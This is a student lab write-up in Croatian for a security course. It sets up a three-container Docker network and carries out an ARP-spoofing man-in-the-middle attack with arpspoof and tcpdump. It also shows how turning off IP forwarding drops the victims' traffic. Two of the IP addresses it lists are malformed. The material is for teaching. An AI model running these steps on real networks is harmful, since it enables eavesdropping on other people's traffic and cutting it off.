# Sigurnost Računala i Podataka

# **1. Laboratorijska vježba**

### *Man-in-the middle attacks (ARP spoofing)*

October 19, 2021 

## Zadatak:

Realizirati *man in the middle* napad iskorištavanjem ranjivosti ARP protokola. Student će testirati napad u virtualiziranoj [Docker](https://docs.docker.com/get-started/overview/) mreži ([Docker container networking](https://docs.docker.com/network/)) koju čine 3 virtualizirana Docker računala (eng. *container*): 

- dvije *žrtve*
    - `station-1`
    - `station-2`
- napadač
    - `evil-station`.

---

### 1. Korak

a) **Otvaranje Windows terminal aplikaciju**

[Windows Terminal Icon.jfif](Sigurnost%20Rac%CC%8Cunala%20i%20Podataka%205e50066b481d462ba4fa1924b0b48f6f/Windows_Terminal_Icon.jfif)

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! [https://aka.ms/PSWindows](https://aka.ms/PSWindows)

PS C:\Users\mateo>

b) **Pozicioniranje na željeni direktorij (npr. *Desktop*)**

```bash
cd .\Desktop\
```

C:\Users\mateo\Desktop>

c) **Kloniranje repozitorija**

```bash
git clone https://github.com/mcagalj/CNS-2020-21.git
```

C:\Users\mateo\Desktop> git clone [https://github.com/mcagalj/CNS-2020-21.git](https://github.com/mcagalj/CNS-2020-21.git)
Cloning into 'CNS-2020-21'...
remote: Enumerating objects: 322, done.
remote: Counting objects: 100% (322/322), done.
remote: Compressing objects: 100% (271/271), done.
remote: Total 322 (delta 55), reused 298 (delta 34), pack-reused 0
Receiving objects: 100% (322/322), 2.27 MiB | 2.80 MiB/s, done.
Resolving deltas: 100% (55/55), done.

### 2. Korak

a) **Otvaranje Ubuntu terminal na WSL sustavu**

![Untitled](Sigurnost%20Rac%CC%8Cunala%20i%20Podataka%205e50066b481d462ba4fa1924b0b48f6f/Untitled.png)

![Untitled](Sigurnost%20Rac%CC%8Cunala%20i%20Podataka%205e50066b481d462ba4fa1924b0b48f6f/Untitled%201.png)

b) **Pozicioniranje na radni direktorij**

```bash
cd Desktop/CNS-2020-21/arp-spoofing/
```

root@DESKTOP-1UB0JJO:/mnt/c/Users/mateo/Desktop/CNS-2020-21/arp-spoofing#

---

### Napomena

**U slučaju da se pojavi problem u koraku 3:**

bash: ./start.sh: /bin/bash^M: bad interpreter: No such file or directory

**Potrebno je upisati u Ubuntu terminalu:**

```bash
sed -i -e 's/\r$//' start.sh
sed -i -e 's/\r$//' stop.sh
```

**Ili problem:**

The command 'docker' could not be found in this WSL 2 distro.
We recommend to activate the WSL integration in Docker Desktop settings.

**Potrebno je upaliti Docker aplikaciju ili je resetirati ukoliko je upaljena, pri čemu je omogućena integracija sa Ubuntu u postavkama:**

Settings → Resources → WSL INTEGRATION

**Ili pratiti upute na [https://docs.docker.com/go/wsl2/](https://docs.docker.com/go/wsl2/) ukoliko problem nije riješen.**

---

### 3. Korak

a) **Pokretanje virtualnog mrežnog scenarija**

```bash
./start.sh
```

No running containers to stop.
Removing existing containers, networks, images ...
station-1
station-2
evil-station
cns-lab
Untagged: cns/station:ver1.0
Deleted: sha256:23d2f793e9470d849039c15fe358a3997b6de0238d42ee3283ba05996a2b0bdc
Building a new image cns/station:ver1.0 ...
station-2 uses an image, skipping
evil-station uses an image, skipping
Building station-1
[+] Building 0.1s (11/11) FINISHED
=> [internal] load build definition from Dockerfile                                                               0.1s
=> => transferring dockerfile: 32B                                                                                       0.0s
=> [internal] load .dockerignore                                                                                           0.0s
=> => transferring context: 2B                                                                                             0.0s
=> [internal] load metadata for [docker.io/library/ubuntu:latest](http://docker.io/library/ubuntu:latest)                                          0.0s
=> [1/7] FROM [docker.io/library/ubuntu](http://docker.io/library/ubuntu)                                                                              0.0s
=> CACHED [2/7] RUN apt-get -y update                                                                            0.0s
=> CACHED [3/7] RUN apt-get install -y iputils-ping                                                           0.0s
=> CACHED [4/7] RUN apt-get install -y net-tools                                                               0.0s
=> CACHED [5/7] RUN apt-get install -y dsniff                                                                     0.0s
=> CACHED [6/7] RUN apt-get install -y tcpdump                                                               0.0s
=> CACHED [7/7] RUN apt-get install -y netcat                                                                    0.0s
=> exporting to image                                                                                                           0.0s
=> => exporting layers                                                                                                          0.0s
=> => writing image sha256:23d2f793e9470d849039c15fe358a3997b6de0238d42ee3283ba05996a2b0bdc       0.0s
=> => naming to [docker.io/cns/station:ver1.0](http://docker.io/cns/station:ver1.0)                                                                      0.0s

Use 'docker scan' to run Snyk tests against images to find vulnerabilities and learn how to fix them
Creating and starting containers ...
Creating network "cns-lab" with the default driver
Creating station-1 ... done
Creating evil-station ... done
Creating station-2    ... done

b) **Izlist pokrenutih kontejnera**

```bash
docker ps
```

CONTAINER ID   IMAGE                COMMAND   CREATED         STATUS         PORTS     NAMES
852b00124f99   cns/station:ver1.0   "bash"    2 minutes ago   Up 2 minutes             evil-station
af9209946916   cns/station:ver1.0   "bash"    2 minutes ago   Up 2 minutes              station-2
5b655015449c   cns/station:ver1.0   "bash"    2 minutes ago   Up 2 minutes             station-1

c) **Pokretanje interaktivnog shella u `station-1` kontejneru**

```bash
docker exec -it station-1 bash
```

root@station-1:/#

d) **Dohvaćanje konfiguracije mrežnog interfejsa `station-1`**

```bash
ifconfig -a
```

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
                 inet 172.18.0.2  netmask 255.255.0.0  broadcast 172.18.255.255
                 ether 02:42:ac:12:00:02  txqueuelen 0  (Ethernet)
                 RX packets 18  bytes 1532 (1.5 KB)
                 RX errors 0  dropped 0  overruns 0  frame 0
                 TX packets 0  bytes 0 (0.0 B)
                 TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

**Dobivene informacije:**

- IP adresa: 172.18.0.1.2
- Ethernet:  02:42:ac:12:00:02

e) **Provjeravanje postojanosti `station-2` na istoj mreži**

```bash
ping station-2
```

PING station-2 (172.18.0.3) 56(84) bytes of data.
64 bytes from station-2.cns-lab (172.18.0.3): icmp_seq=1 ttl=64 time=0.420 ms
64 bytes from station-2.cns-lab (172.18.0.3): icmp_seq=2 ttl=64 time=0.142 ms

### 4. Korak

a) **Ponoviti korak 2 (dva puta) gjde se pri tom koristi "Alt" + "Lijevi klik miša" za otvaranje dodatnih Ubuntu terminala**

![Untitled](Sigurnost%20Rac%CC%8Cunala%20i%20Podataka%205e50066b481d462ba4fa1924b0b48f6f/Untitled%202.png)

b) **U novootvorenim treminalima pokrenuti interaktivni shell u `station-2` kontejneru, odnosno interaktivni shell u `evil-station` kontejneru**

```bash
docker exec -it station-2 bash
```

```bash
docker exec -it evil-station bash
```

![Untitled](Sigurnost%20Rac%CC%8Cunala%20i%20Podataka%205e50066b481d462ba4fa1924b0b48f6f/Untitled%203.png)

c) **Dohvaćanje konfiguracije mrežnog interfejsa `station-2`, odnosno `evil-station` (korak 3e)**

**Dobivene informacije:**

**`station-2`**

- IP adresa: 172.18.0.1.3
- Ethernet:  02:42:ac:12:00:03

**`evil-station`**

- IP adresa: 172.18.0.4
- Ethernet:  02:42:ac:12:00:04

### 5. Korak

a) **Na kontejneru `station-2` otvaramo server TCP socket na portu 8000**

```bash
netcat -lp 8000
```

b) **Na kontejneru `station-1`  otvaramo client TCP socket na hostnameu  `station-2` 8000**

```bash
netcat station-2 8000
```

### 6. Korak (Napad)

a ) **U kontejneru `evil-station` pokrećemo arpspoof**

```bash
arpspoof -t station-1 station-2
```

b) **Otvaranje dodatnog Ubunutu terminala (kao korak 4a i 4b) za `evil-station`**

![Untitled](Sigurnost%20Rac%CC%8Cunala%20i%20Podataka%205e50066b481d462ba4fa1924b0b48f6f/Untitled%204.png)

c) **Pokrećemo tcpdump u kontejneru `evil-station` i pratimo promet (novi terminal)**

```bash
tcpdump
```

![Untitled](Sigurnost%20Rac%CC%8Cunala%20i%20Podataka%205e50066b481d462ba4fa1924b0b48f6f/Untitled%205.png)

c) **Za filtiranje podatka, odnosno zanemarivanje paketa stvorenog od `evil-station`**

```bash
tcpdump tcp
```

![Untitled](Sigurnost%20Rac%CC%8Cunala%20i%20Podataka%205e50066b481d462ba4fa1924b0b48f6f/Untitled%206.png)

**Ili još za prikaz podataka u hex prikazu**

```bash
tcpdump tcp -X
```

![Untitled](Sigurnost%20Rac%CC%8Cunala%20i%20Podataka%205e50066b481d462ba4fa1924b0b48f6f/Untitled%207.png)

**Ili za gašenje prosljeđivanja spoofanih paketa**

```bash
echo 0 > /proc/sys/net/ipv4/ip_forward
```

![Untitled](Sigurnost%20Rac%CC%8Cunala%20i%20Podataka%205e50066b481d462ba4fa1924b0b48f6f/Untitled%208.png)

### 7. Korak

a) **Izlaženje iz interaktivnog shella u kontejnerima**

```bash
exit
```

b) **Zaustavljanje virtualiziranog mrežnog scenarija**

```bash
./stop.sh
```

Stoping running containers:
852b00124f99
af9209946916
5b655015449c